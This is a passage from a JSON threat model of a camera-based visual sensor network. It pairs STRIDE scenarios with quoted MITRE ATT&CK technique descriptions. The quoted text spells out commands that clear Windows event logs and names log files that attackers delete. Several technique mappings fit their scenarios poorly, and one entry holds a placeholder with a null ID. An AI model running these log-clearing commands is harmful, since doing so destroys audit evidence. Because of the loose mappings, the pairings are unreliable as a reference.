                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof an administrator's identity to gain access to the VSN management console.",
            "Assumptions": [
                {
                    "Assumption": "The VSN management console does not employ multi-factor authentication (MFA).",
                    "Role": "System Administrator",
                    "Condition": "During the authentication process."
                },
                {
                    "Assumption": "Attackers have access to admin credentials through phishing or other means.",
                    "Role": "Security Engineer",
                    "Condition": "When credentials are obtained via social engineering or data breaches."
                }
            ],
            "Potential Impact": "Full control over VSN and access to all captured visual data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "management console"
            ],
            "mitre_technique": {
                "name": "Gather Victim Identity Information",
                "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "id": "attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4",
                "technique_id": "T1589"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the network traffic to inject fake visual data into the VSN.",
            "Assumptions": [
                {
                    "Assumption": "There is inadequate encryption and integrity checks on the transmitted data.",
                    "Role": "Network Engineer",
                    "Condition": "During data transmission across the network."
                },
                {
                    "Assumption": "Attackers have the capability to intercept and modify network traffic.",
                    "Role": "Cybersecurity Specialist",
                    "Condition": "When network traffic is not properly secured."
                }
            ],
            "Potential Impact": "Corruption of visual data and misleading of system responses.",
            "MITRE ATT&CK Keywords": [
                "network",
                "data injection",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the firmware of the camera nodes to include malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes do not verify the integrity of firmware updates via secure boot or code signing.",
                    "Role": "Firmware Developer",
                    "Condition": "During the firmware update process."
                },
                {
                    "Assumption": "Attackers can gain physical or network access to deploy the modified firmware.",
                    "Role": "System Integrator",
                    "Condition": "When deploying or updating firmware."
                }
            ],
            "Potential Impact": "Compromise the functionality and security of camera nodes.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter the captured visual data before it reaches the central processing node.",
            "Assumptions": [
                {
                    "Assumption": "Data integrity checks are not performed or are weak.",
                    "Role": "Data Engineer",
                    "Condition": "During data transmission and storage."
                },
                {
                    "Assumption": "There is an ability to intercept and manipulate the data in transit.",
                    "Role": "Cybersecurity Expert",
                    "Condition": "When data is transmitted over unsecured channels."
                }
            ],
            "Potential Impact": "Misleading data analysis and decision-making based on false data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data manipulation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify configuration files to disable security settings.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are stored without proper access controls.",
                    "Role": "System Administrator",
                    "Condition": "During management and application of configuration files."
                },
                {
                    "Assumption": "Attackers have write access to configuration files.",
                    "Role": "Security Auditor",
                    "Condition": "When access controls are weak or misconfigured."
                }
            ],
            "Potential Impact": "Reduced security posture for the entire VSN.",
            "MITRE ATT&CK Keywords": [
                "configuration file",
                "tampering",
                "settings"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could perform unauthorized actions on the VSN management system and deny doing so.",
            "Assumptions": [
                {
                    "Assumption": "There is inadequate logging or log tampering is easy to perform.",
                    "Role": "System Log Manager",
                    "Condition": "During recording and storing of action logs."
                },
                {
                    "Assumption": "There are no immutable audit logs for security-critical operations.",
                    "Role": "Compliance Officer",
                    "Condition": "During critical actions or changes in the system."
                }
            ],
            "Potential Impact": "Difficulty in tracking malicious actions and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user can deny sending or receiving certain visual data.",
            "Assumptions": [
                {
                    "Assumption": "There is a lack of non-repudiation mechanisms in data transmission.",
                    "Role": "Network Architect",
                    "Condition": "During data transmission between nodes."
                },
                {
                    "Assumption": "Logs are not digitally signed or timestamped.",
                    "Role": "System Developer",
                    "Condition": "When logs are generated and stored."
                }
            ],
            "Potential Impact": "Challenges in verifying data authenticity and origin.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "data transmission",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator could deny making specific configuration changes.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged or logs can be altered.",
                    "Role": "System Administrator",
                    "Condition": "During configuration management operations."
                },
                {
                    "Assumption": "Logs lack sufficient detail to attribute actions to specific users.",
                    "Role": "Security Analyst",
                    "Condition": "When logging user activity."
                }
            ],
            "Potential Impact": "Lack of accountability and potential security risks from untracked changes.",
            "MITRE ATT&CK Keywords": [
                "configuration management",
                "logging",
                "audit"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data could be intercepted during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without or with weak encryption.",
                    "Role": "Network Engineer",
                    "Condition": "During the transmission of data over the network."
                },
                {
                    "Assumption": "Attackers have the capability to intercept network traffic.",
                    "Role": "Cybersecurity Specialist",
                    "Condition": "When network traffic is not properly secured."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit a vulnerability in the camera nodes to access stored data.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes store data locally and can be accessed using vulnerabilities.",
                    "Role": "IoT Engineer",
                    "Condition": "During node operation and data storage."
                },
                {
                    "Assumption": "Known vulnerabilities are not patched or mitigated.",
                    "Role": "Security Administrator",
                    "Condition": "When maintaining and updating node software."
                }
            ],
            "Potential Impact": "Exposure of sensitive data stored on camera nodes.",
            "MITRE ATT&CK Keywords": [
                "data access",
                "vulnerability exploitation",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A misconfigured camera node could inadvertently expose visual data to unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes are not properly configured with access controls.",
                    "Role": "System Integrator",
                    "Condition": "During deployment and configuration of camera nodes."
                },
                {
                    "Assumption": "Users have access to network segments where data is exposed.",
                    "Role": "User",
                    "Condition": "When accessing local network resources."
                }
            ],
            "Potential Impact": "Unauthorized users gaining access to sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "misconfiguration",
                "access control",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could flood the network with traffic causing disruption in visual data transmission.",
            "Assumptions": [
                {
                    "Assumption": "The network lacks proper rate limiting and traffic analysis.",
                    "Role": "Network Administrator",
                    "Condition": "During network configuration and monitoring."
                },
                {
                    "Assumption": "Attackers have the capability to generate significant traffic loads.",
                    "Role": "Security Analyst",
                    "Condition": "When attackers have sufficient resources or botnets."
                }
            ],
            "Potential Impact": "Disruption of visual data transmission, affecting availability.",
            "MITRE ATT&CK Keywords": [
                "network flooding",
                "denial of service",
                "traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit a vulnerability in the camera nodes causing them to crash.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes have unpatched vulnerabilities that could be exploited.",
                    "Role": "System Administrator",
                    "Condition": "During node deployment and maintenance."
                },
                {
                    "Assumption": "Attackers have the capability to exploit such vulnerabilities remotely.",
                    "Role": "Cybersecurity Specialist",
                    "Condition": "When attackers have network access."
                }
            ],
            "Potential Impact": "Loss of visual data input from affected camera nodes, affecting availability.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "denial of service",
                "device crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware infection could disrupt the normal operation of camera nodes or the VSN management system.",
            "Assumptions": [
                {
                    "Assumption": "Malware prevention and detection mechanisms are insufficient.",
                    "Role": "IT Security Personnel",
                    "Condition": "During ongoing system operations and updates."
                },
                {
                    "Assumption": "Nodes and central system lack robust defense-in-depth strategies.",
                    "Role": "Security Architect",
                    "Condition": "When designing and implementing security measures."
                }
            ],
            "Potential Impact": "Widespread system disruptions and loss of service availability.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "denial of service",
                "disruption"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a software vulnerability to gain higher privileges on a camera node.",
            "Assumptions": [
                {
                    "Assumption": "Node software has vulnerabilities that have not been patched.",
                    "Role": "System Administrator",
                    "Condition": "During ongoing software maintenance."
                },
                {
                    "Assumption": "Attackers have basic access to the node or network.",
                    "Role": "Network User",
                    "Condition": "When initial access is gained through other exploits."
                }
            ],
            "Potential Impact": "Control over node operations and potential access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "software vulnerability",
                "device control"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could take advantage of a misconfigured network service to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Network services are not configured with least privilege principles.",
                    "Role": "Network Engineer",
                    "Condition": "During network service setup and configuration."
                },
                {
                    "Assumption": "Attackers can identify and exploit these misconfigurations.",
                    "Role": "Penetration Tester",
                    "Condition": "When performing security testing or active reconnaissance."
                }
            ],
            "Potential Impact": "Increased access to network resources and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "misconfiguration",
                "privilege escalation",
                "network service"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
